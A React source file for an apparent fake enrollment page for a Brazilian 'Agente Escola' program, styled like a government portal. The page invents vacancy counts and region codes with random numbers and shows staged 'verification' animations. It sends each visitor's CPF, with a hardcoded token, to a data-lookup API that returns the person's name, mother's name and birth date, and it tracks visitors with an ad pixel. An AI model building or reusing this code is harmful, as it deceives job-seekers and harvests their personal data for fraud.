import React, { useState, useEffect } from "react";
import { Check, MapPin, DollarSign, GraduationCap, Award, Search } from "lucide-react";
import { useLocation } from "../context/LocationContext";
import { useUser } from "../context/UserContext";
import ReactPixel from "react-facebook-pixel";
import { hashUserData } from "../utils/pixel";
import useUtmNavigator from "../hooks/useUtmNavigator";
import { usePixelTracking } from '../hooks/usePixelTracking';
import axios from "axios";

interface School {
	id: string;
	name: string;
	type: string;
	distance: number;
}

interface AddressInfo {
	cep: string;
	logradouro: string;
	bairro: string;
	localidade: string;
	uf: string;
	codigoRegiao: string;
	pontoAtendimento: string;
	vagasDisponiveis: number;
	nearbySchools: School[];
}

interface UserInfo {
	cpf: string;
	nome: string;
	nome_mae: string;
	data_nascimento: string;
	sexo: string;
}

interface VerificationStep {
	label: string;
	status: "pending" | "processing" | "completed";
}

const validateCEP = async (cep: string) => {
  try {
    // 1. Get address from ViaCEP
    const viaCepResponse = await axios.get(`https://viacep.com.br/ws/${cep}/json/`);
    if (viaCepResponse.data.erro) {
      throw new Error("CEP não encontrado");
    }

    // 2. Get coordinates from Nominatim
    const address = `${viaCepResponse.data.logradouro}, ${viaCepResponse.data.localidade}, ${viaCepResponse.data.uf}, Brazil`;
    const nominatimResponse = await axios.get(
      `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(address)}`
    );

    if (!nominatimResponse.data.length) {
      throw new Error("Localização não encontrada");
    }

    const { lat, lon } = nominatimResponse.data[0];

    // 3. Search for schools using Overpass API
    const overpassQuery = `
      [out:json][timeout:25];
      (
        node["amenity"="school"](around:10000,${lat},${lon});
        way["amenity"="school"](around:10000,${lat},${lon});
        relation["amenity"="school"](around:10000,${lat},${lon});
      );
      out body;
      >;
      out skel qt;
    `;

    const overpassResponse = await axios.post(
      'https://overpass-api.de/api/interpreter',
      overpassQuery,
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    // Process schools
    const schools = overpassResponse.data.elements
      .filter(element => element.tags && element.tags.name)
      .map(element => ({
        id: element.id.toString(),
        name: element.tags.name,
        type: element.tags.school_type || 'Escola pública',
        distance: calculateDistance(lat, lon, element.lat, element.lon)
      }))
      .sort((a, b) => a.distance - b.distance)
      .slice(0, 3);

    return {
      address: viaCepResponse.data,
      schools,
      coordinates: { lat, lon }
    };
  } catch (error) {
    console.error('Error fetching location data:', error);
    throw error;
  }
};

const calculateDistance = (lat1: number, lon1: number, lat2: number, lon2: number) => {
  const R = 6371; // Earth's radius in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = 
    Math.sin(dLat/2) * Math.sin(dLat/2) +
    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * 
    Math.sin(dLon/2) * Math.sin(dLon/2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  return R * c;
};

const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?: UserInfo }> => {
	const numericCPF = cpf.replace(/\D/g, "");

	if (numericCPF.length !== 11) {
		return { valid: false };
	}

	if (/^(\d)\1{10}$/.test(numericCPF)) {
		return { valid: false };
	}

	let sum = 0;
	for (let i = 0; i < 9; i++) {
		sum += parseInt(numericCPF.charAt(i)) * (10 - i);
	}
	let digit1 = 11 - (sum % 11);
	if (digit1 > 9) digit1 = 0;

	sum = 0;
	for (let i = 0; i < 10; i++) {
		sum += parseInt(numericCPF.charAt(i)) * (11 - i);
	}
	let digit2 = 11 - (sum % 11);
	if (digit2 > 9) digit2 = 0;

	if (parseInt(numericCPF.charAt(9)) !== digit1 || parseInt(numericCPF.charAt(10)) !== digit2) {
		return { valid: false };
	}

	try {
		const url = `https://magmadatahub.com/api.php?token=bef7dbfe0994308f734fbfb4e2a0dec17aa7baed9f53a0f5dd700cf501f39f26&cpf=${numericCPF}`;
		
		console.log('Consultando API de CPF:', url.replace(numericCPF, '***'));
		
		const response = await axios.get(url, { timeout: 8000 });

		const body = response.data;
		console.log('Resposta da API:', body);

		// Verifica se é um erro da API
		if (body?.status === 'error' || body?.error) {
			console.warn('CPF API: erro retornado', body);
			return {
				valid: true,
				data: {
					cpf: numericCPF,
					nome: "",
					nome_mae: "",
					data_nascimento: "",
					sexo: ""
				}
			};
		}

		// Suporta diferentes formatos da MagmaDataHub
		// Pode ser: body.DADOS, body.dados, body.data, array ou diretamente no body
		let dados = body?.DADOS || body?.dados || body?.data;
		
		if (!dados && Array.isArray(body) && body.length > 0) {
			dados = body[0];
		}
		
		// Se nada acima funcionou, talvez os dados estejam diretamente no body
		if (!dados && body?.nome) {
			dados = body;
		}

		if (!dados || !dados.nome) {
			console.warn('CPF API: dados incompletos na resposta', body);
			return {
				valid: true,
				data: {
					cpf: numericCPF,
					nome: "",
					nome_mae: "",
					data_nascimento: "",
					sexo: ""
				}
			};
		}

		// Extrai os dados com múltiplas variações de nomes de campo
		const nome = dados.nome || dados.NOME || dados.full_name || dados.nome_completo || "";
		const cpfField = dados.cpf || dados.CPF || numericCPF;
		const nomeMae = dados.nome_mae || dados.mae || dados.nomeDaMae || dados.MAE || "";
		const dataNascimento = dados.data_nascimento || dados.nascimento || dados.birthdate || dados.DATA_NASCIMENTO || "";
		const sexoField = (dados.sexo || dados.SEXO || "").toString();

		console.log('Dados extraídos:', { nome, cpfField, nomeMae, dataNascimento, sexoField });

		return {
			valid: true,
			data: {
				cpf: cpfField,
				nome: nome,
				nome_mae: nomeMae,
				data_nascimento: dataNascimento,
				sexo: sexoField
			}
		};
	} catch (error) {
		console.error('Erro ao consultar API de CPF:', error);
		// Se a API falhar, aceitar o CPF que passou na validação de formato
		return {
			valid: true,
			data: {
				cpf: numericCPF,
				nome: "",
				nome_mae: "",
				data_nascimento: "",
				sexo: ""
			}
		};
	}
};

const schoolsDatabase: Record<string, School[]> = {
	SP: [
		{ id: "escola-1", name: "Escola Municipal Maria Luiza", type: "Escola pública", distance: 1.2 },
		{ id: "escola-2", name: "Escola Estadual Paulo Freire", type: "Escola pública", distance: 1.8 },
		{ id: "escola-3", name: "EMEF Anísio Teixeira", type: "Escola pública", distance: 2.3 },
		{ id: "escola-4", name: "Escola Municipal Castro Alves", type: "Escola pública", distance: 2.7 },
	],
	RJ: [
		{ id: "escola-5", name: "Colégio Municipal Pedro II", type: "Escola pública", distance: 1.5 },
		{ id: "escola-6", name: "Escola Estadual Tiradentes", type: "Escola pública", distance: 2.0 },
		{ id: "escola-7", name: "CIEP Darcy Ribeiro", type: "Escola pública", distance: 2.4 },
	],
};

const Inscription: React.FC = () => {
	usePixelTracking();
	
	const navigate = useUtmNavigator();
	const [cep, setCep] = useState("");
	const [cpf, setCpf] = useState("");
	const [addressInfo, setAddressInfo] = useState<AddressInfo | null>(null);
	const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
	const [loading, setLoading] = useState(false);
	const [error, setError] = useState("");
	const [acceptedTerms, setAcceptedTerms] = useState(false);
	const [verificationSteps, setVerificationSteps] = useState<VerificationStep[]>([
		{ label: "Validando CPF", status: "pending" },
		{ label: "Verificando Nome", status: "pending" },
		{ label: "Verificando Nome da Mãe", status: "pending" },
		{ label: "Validando Data de Nascimento", status: "pending" },
		{ label: "Verificando Elegibilidade", status: "pending" },
	]);
	const [isVerifying, setIsVerifying] = useState(false);
	const [verificationComplete, setVerificationComplete] = useState(false);
	const [name, setName] = useState("");

	const { setLocationInfo } = useLocation();
	const { setUserName } = useUser();

	const [showVerifyingPopup, setShowVerifyingPopup] = useState(false);
	const [showAvailablePopup, setShowAvailablePopup] = useState(false);
	const [currentStep, setCurrentStep] = useState(0);

	useEffect(() => {
		ReactPixel.init("617874301266607");

		ReactPixel.track("PageView", {
			event_name: "PageView",
			event_time: Math.floor(Date.now() / 1000),
			event_id: "PageView_" + Date.now(),
			action_source: "website",
			user_data: hashUserData({}),
			custom_data: {
				order_id: "",
				currency: "BRL",
				value: 0,
				content_name: "",
				content_ids: "",
				contents: "",
				num_items: 1,
			},
		});
	}, []);

	const formatCEP = (value: string) => {
		const numbers = value.replace(/\D/g, "");
		if (numbers.length <= 5) return numbers;
		return `${numbers.slice(0, 5)}-${numbers.slice(5, 8)}`;
	};

	const formatCPF = (value: string) => {
		const numbers = value.replace(/\D/g, "");
		if (numbers.length <= 3) return numbers;
		if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
		if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
		return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
	};



	const formatDate = (dateString: string) => {
		const date = new Date(dateString);
		return date.toLocaleDateString('pt-BR');
	};

	const handleCEPChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const formatted = formatCEP(e.target.value);
		if (formatted.length <= 9) {
			setCep(formatted);
		}
	};

	const validateCEPAndFindSchools = async () => {
		setLoading(true);
		setError("");
		setAddressInfo(null);
		setShowVerifyingPopup(true);
		setCurrentStep(0);

		try {
			const cleanCEP = cep.replace(/\D/g, "");
			
			await new Promise(resolve => setTimeout(resolve, 2000));
			setCurrentStep(1);
			
			const locationData = await validateCEP(cleanCEP);
			
			setCurrentStep(2);
			await new Promise(resolve => setTimeout(resolve, 1500));

			const addressInfo: AddressInfo = {
				cep: cleanCEP,
				logradouro: locationData.address.logradouro,
				bairro: locationData.address.bairro,
				localidade: locationData.address.localidade,
				uf: locationData.address.uf,
				codigoRegiao: `${locationData.address.uf}-${Math.floor(Math.random() * 90 + 10)}-${Math.floor(Math.random() * 900 + 100)}`,
				pontoAtendimento: locationData.schools[0].name,
				vagasDisponiveis: Math.floor(Math.random() * 50) + 1,
				nearbySchools: locationData.schools
			};

			setAddressInfo(addressInfo);
			setLocationInfo(cleanCEP, locationData.schools);
			
			setShowVerifyingPopup(false);
			await new Promise(resolve => setTimeout(resolve, 500));
			setShowAvailablePopup(true);
			await new Promise(resolve => setTimeout(resolve, 3000));
			setShowAvailablePopup(false);

		} catch (err) {
			setError("CEP não encontrado. Por favor, verifique o número e tente novamente.");
			setShowVerifyingPopup(false);
		} finally {
			setLoading(false);
		}
	};

	const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const formatted = formatCPF(e.target.value);
		if (formatted.length <= 14) {
			setCpf(formatted);
		}
		setVerificationComplete(false);
		setIsVerifying(false);
		setVerificationSteps((steps) => steps.map((step) => ({ ...step, status: "pending" })));
	};

	const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const newName = e.target.value;
		setName(newName);
		setUserName(newName);
	};

	const updateVerificationStep = async (index: number) => {
		setVerificationSteps((steps) =>
			steps.map((step, i) => ({
				...step,
				status: i === index ? "processing" : step.status,
			})),
		);

		await new Promise((resolve) => setTimeout(resolve, 800));

		setVerificationSteps((steps) =>
			steps.map((step, i) => ({
				...step,
				status: i <= index ? "completed" : step.status,
			})),
		);
	};

	const validateCPF = async () => {
		setLoading(true);
		setError("");
		setIsVerifying(true);
		setVerificationComplete(false);

		try {
			for (let i = 0; i < verificationSteps.length; i++) {
				await updateVerificationStep(i);
			}

			const result = await validateCPFFromAPI(cpf);

			if (!result.valid) {
				throw new Error("CPF inválido");
			}

			setVerificationComplete(true);
			if (result.data) {
				setUserInfo(result.data);
				setName(result.data.nome);
				setUserName(result.data.nome);
			}
		} catch (err) {
			setError("CPF inválido. Por favor, verifique o número e tente novamente.");
			setVerificationComplete(false);
			setIsVerifying(false);
			setVerificationSteps((steps) => steps.map((step) => ({ ...step, status: "pending" })));
		} finally {
			setLoading(false);
		}
	};

	const handleSubmit = () => {
		if (addressInfo && acceptedTerms) {
			navigate("/programa");
		}
	};

	return (
		<main className="container mx-auto px-4 py-4 flex-grow">
			{showVerifyingPopup && (
				<div className="fixed top-0 left-0 right-0 bg-white shadow-lg z-50 animate-slideDown">
					<div className="max-w-2xl mx-auto p-4">
						<div className="flex items-center gap-4">
							{currentStep === 0 && (
								<>
									<div className="w-8 h-8">
										<div className="w-8 h-8 border-4 border-[#1351B4] border-l-transparent rounded-full animate-spin"></div>
									</div>
									<div>
										<h2 className="text-lg font-semibold">Verificando disponibilidade...</h2>
										<p className="text-sm text-gray-600">
											Estamos consultando a base de dados para verificar disponibilidade na sua região.
										</p>
									</div>
								</>
							)}
							{currentStep === 1 && (
								<>
									<div className="w-8 h-8">
										<div className="w-8 h-8 border-4 border-[#1351B4] border-l-transparent rounded-full animate-spin"></div>
									</div>
									<div>
										<h2 className="text-lg font-semibold">Analisando região...</h2>
										<p className="text-sm text-gray-600">
											Verificando vagas disponíveis e unidades próximas ao seu endereço.
										</p>
									</div>
								</>
							)}
							{currentStep === 2 && (
								<>
									<div className="w-8 h-8">
										<div className="w-8 h-8 border-4 border-[#1351B4] border-l-transparent rounded-full animate-spin"></div>
									</div>
									<div>
										<h2 className="text-lg font-semibold">Finalizando...</h2>
										<p className="text-sm text-gray-600">
											Preparando informações sobre as vagas disponíveis.
										</p>
									</div>
								</>
							)}
						</div>
					</div>
				</div>
			)}

			{/* Available Popup */}
			{showAvailablePopup && addressInfo && (
				<div className="fixed top-0 left-0 right-0 bg-green-50 shadow-lg z-50 animate-slideDown">
					<div className="max-w-2xl mx-auto p-4">
						<div className="flex items-center gap-4">
							<div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
								<Check className="w-5 h-5 text-green-500" />
							</div>
							<div>
								<h2 className="text-lg font-semibold">Vagas Disponíveis!</h2>
								<p className="text-sm text-gray-600">
									Existem {addressInfo.vagasDisponiveis} vagas disponíveis para {addressInfo.bairro}, {addressInfo.localidade}/{addressInfo.uf}.
								</p>
							</div>
						</div>
					</div>
				</div>
			)}

			<div className="max-w-lg mx-auto">
				<div className="mb-6">
					<h1 className="text-[#1351B4] text-2xl font-bold">Programa Agente Escola</h1>
					<div className="h-1 w-48 bg-[#2ECC71] mt-2"></div>
				</div>

				<div className="bg-white rounded-lg p-6 shadow-sm">
					<div className="mb-8">
						<h2 className="text-xl font-bold mb-3">Verificação de Disponibilidade</h2>
						<p className="text-[#505A5F] text-base">
							Para iniciar sua inscrição no programa Agente Escola do Futuro, primeiro verifique se há vagas
							disponíveis em sua região. Digite seu CEP abaixo para consultar a disponibilidade.
						</p>
					</div>

					<div className="mb-6">
						<label htmlFor="cep" className="block text-lg font-bold mb-2">
							CEP
						</label>
						<input
							type="text"
							id="cep"
							inputMode="numeric"
							pattern="\d*"
							placeholder="Digite seu CEP (Ex: 12345-678)"
							value={cep}
							onChange={handleCEPChange}
							maxLength={9}
							className="w-full p-4 border-2 border-[#1351B4] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
						/>
						<p className="text-[#505A5F] text-sm mt-2">
							Digite o CEP da sua residência para verificarmos a disponibilidade na sua região
						</p>
					</div>

					<button
						onClick={validateCEPAndFindSchools}
						disabled={loading || cep.length < 9}
						className="w-full bg-[#1351B4] text-white py-4 rounded-lg flex items-center justify-center gap-2 hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
					>
						<Search size={20} />
						<span className="font-semibold">Verificar Disponibilidade</span>
					</button>

					{error && <div className="mt-6 p-4 bg-red-50 border-l-4 border-red-500 text-red-700">{error}</div>}

					{addressInfo && (
						<>
							<div className="mt-8 p-6 border border-green-200 rounded-lg bg-green-50">
								<h2 className="text-2xl font-bold text-green-700 mb-6">Vagas Disponíveis!</h2>

								<p className="text-lg mb-6">
									Encontramos {addressInfo.vagasDisponiveis} vagas disponíveis para sua região.
								</p>

								<div className="space-y-4 mb-8">
									<div>
										<span className="font-bold">CEP consultado:</span> {cep}
									</div>
									<div>
										<span className="font-bold">Localidade:</span> {addressInfo.localidade}/
										{addressInfo.uf}
									</div>
									<div>
										<span className="font-bold">Bairro:</span> {addressInfo.bairro}
									</div>
									<div>
										<span className="font-bold">Logradouro:</span> {addressInfo.logradouro}
									</div>
									<div>
										<span className="font-bold">Ponto de atendimento:</span>{" "}
										{addressInfo.pontoAtendimento}
									</div>
									<div>
										<span className="font-bold">Código da região:</span> {addressInfo.codigoRegiao}
									</div>
								</div>
							</div>

							<div className="mt-8 bg-white rounded-lg p-6">
								<h2 className="text-[#1351B4] text-2xl font-bold mb-2">Formulário de Inscrição</h2>
								<p className="text-gray-600 mb-6">
									Preencha seus dados abaixo para se inscrever no programa Agente Escola.
								</p>

								{verificationComplete ? (
									<>
										<div className="mb-6 bg-blue-50 p-4 rounded-lg">
											<h3 className="text-[#1351B4] font-bold mb-2">Verificação concluída</h3>
											<p className="text-gray-600">
												Seus dados foram verificados com sucesso. Complete o formulário abaixo
												para prosseguir com sua inscrição.
											</p>
										</div>

										<div className="space-y-6">
											<div>
												<label className="block text-sm font-medium text-gray-700 mb-1">
													CPF
												</label>
												<input
													type="text"
													value={userInfo?.cpf ? formatCPF(userInfo.cpf) : cpf}
													disabled
													className="w-full p-3 bg-gray-100 border border-gray-300 rounded-lg"
												/>
											</div>

											<div>
												<label className="block text-sm font-medium text-gray-700 mb-1">
													Nome completo
												</label>
												<input
													type="text"
													value={name}
													onChange={handleNameChange}
													placeholder="Digite seu nome completo"
													disabled={userInfo?.nome ? false : false}
													className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1351B4] focus:border-transparent disabled:bg-gray-50"
												/>
											</div>

                                            

											<div className="flex items-start gap-2 mt-6">
												<input
													type="checkbox"
													id="terms"
													checked={acceptedTerms}
													onChange={(e) => setAcceptedTerms(e.target.checked)}
													className="mt-1"
												/>
												<div>
													<label htmlFor="terms" className="text-sm font-medium">
														Aceito os termos de uso e política de privacidade do programa
														Agente Escola do Futuro
													</label>
													<p className="text-sm text-gray-500 mt-1">
														Ao aceitar os termos, você concorda com as regras do programa e
														permite o uso dos seus dados para fins de inscrição.
													</p>
												</div>
											</div>

											<button
												onClick={handleSubmit}
												disabled={!acceptedTerms}
												className="w-full bg-[#1351B4] text-white py-4 rounded-full flex items-center justify-center gap-2 hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-6"
											>
												<span className="font-semibold">Continuar Inscrição</span>
											</button>
										</div>
									</>
								) : (
									<div className="mb-6">
										<div className="flex gap-2">
											<input
												type="text"
												inputMode="numeric"
												pattern="\d*"
												placeholder="Digite seu CPF (123.456.789-00)"
												value={cpf}
												onChange={handleCPFChange}
												maxLength={14}
												className="flex-1 p-4 border-2 border-[#1351B4] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
											/>
											<button
												onClick={validateCPF}
												disabled={loading || cpf.length < 14}
												className="bg-[#1351B4] text-white p-4 rounded-lg hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
												aria-label="Buscar CPF"
											>
												<Search size={24} />
											</button>
										</div>

										{isVerifying && (
											<div className="mt-6 p-6 bg-blue-50 rounded-lg">
												<h3 className="text-lg font-semibold text-[#1351B4] mb-4">
													Verificação de dados
												</h3>
												<div className="space-y-4">
													{verificationSteps.map((step, index) => (
														<div key={index} className="flex items-center gap-3">
															{step.status === "completed" ? (
																<div className="w-5 h-5 rounded-full bg-green-500 flex items-center justify-center">
																	<Check size={12} className="text-white" />
																</div>
															) : step.status === "processing" ? (
																<div className="w-5 h-5">
																	<div className="w-5 h-5 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
																</div>
															) : (
																<div className="w-5 h-5 rounded-full border-2 border-gray-300"></div>
															)}
															<span
																className={`flex-1 ${
																	step.status === "completed"
																		? "text-green-700"
																		: step.status === "processing"
																		? "text-blue-700"
																		: "text-gray-500"
																}`}
															>
																{step.label}
															</span>
															{step.status === "completed" && (
																<span className="text-green-500 text-sm">Válido</span>
															)}
														</div>
													))}
												</div>
												<div className="mt-4 bg-blue-100 rounded-full overflow-hidden">
													<div
														className="h-2 bg-blue-500 transition-all duration-500"
														style={{
															width: `${
																(verificationSteps.filter(
																	(step) => step.status === "completed",
																).length /
																	verificationSteps.length) *
																100
															}%`,
														}}
													></div>
												</div>
											</div>
										)}
									</div>
								)}
							</div>
						</>
					)}

					<div className="mt-8 bg-[#FFF9E6] rounded-lg p-6 border-l-4 border-[#FFCD07]">
						<h3 className="text-lg font-bold mb-4">Informações Importantes</h3>
						<ul className="space-y-4 text-sm">
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>Apenas cidadãos brasileiros ou naturalizados podem se inscrever.</span>
							</li>
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>É necessário ter ensino médio completo para participar do programa.</span>
							</li>
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>As vagas são distribuídas de acordo com a necessidade de cada município.</span>
							</li>
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>O processo seletivo inclui análise de currículo e entrevista.</span>
							</li>
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>
									A bolsa de capacitação varia entre R$ 3.456,13 a R$ 4.290,71 dependendo da região.
								</span>
							</li>
						</ul>
					</div>
				</div>
			</div>
		</main>
	);
};

export default Inscription;
